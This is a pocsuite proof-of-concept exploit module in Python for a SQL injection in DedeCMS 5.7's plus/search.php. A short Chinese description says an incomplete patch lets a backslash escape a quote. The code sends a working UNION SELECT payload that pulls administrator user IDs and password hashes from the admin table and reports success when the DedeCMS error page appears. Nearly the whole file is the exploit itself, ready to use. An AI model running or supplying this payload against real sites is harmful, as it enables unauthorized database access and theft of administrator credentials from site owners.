#!/usr/bin/env python
#!coding: utf-8
import re

from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class Fuckdede(POCBase):
	vulID='4'
	version = '1'
	author = ['fengxuan']
	vulDate = '2016-2-4'
	createDate = '2016-2-4'
	updateDate = '2016-2-4'
	references = ['http://www.evalshell.com', 'http://zone.wooyun.org/content/2414']
	name = 'dedecms plus/search.php 注入漏洞利用EXP'
	appPowerLink = 'http://www.dedecms.cn/'
	appName = 'dedecms'
	appVersion = '5.7'
	vulType = 'SQL Injection'
	desc = '''
           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接
           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。
           此注入为报错注入，可以通过UpdateXML函数进行注入。
    '''
	samples = ['']

	def _verify(self):
		result = {}
		target = self.url + "/plus/search.php?keyword=as&typeArr[111%3D@%60\%27%60)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%60%23@__admin%60%23@%60\%27%60+]=a"
		response = req.get(target)
		content = response.content
		if 'DedeCMS Error Warning!' in content:
			result = {'VerifyInfo':{}}
			result['VerifyInfo']['URL'] = self.url
		return self.parse_result(result)

	def _attack(self):
		return self._verify()

	def parse_result(self, result):
		output = Output(self)

		if result:
			output.success(result)
		else:
			output.fail("Internet Nothing returned")
		return output

register(Fuckdede)








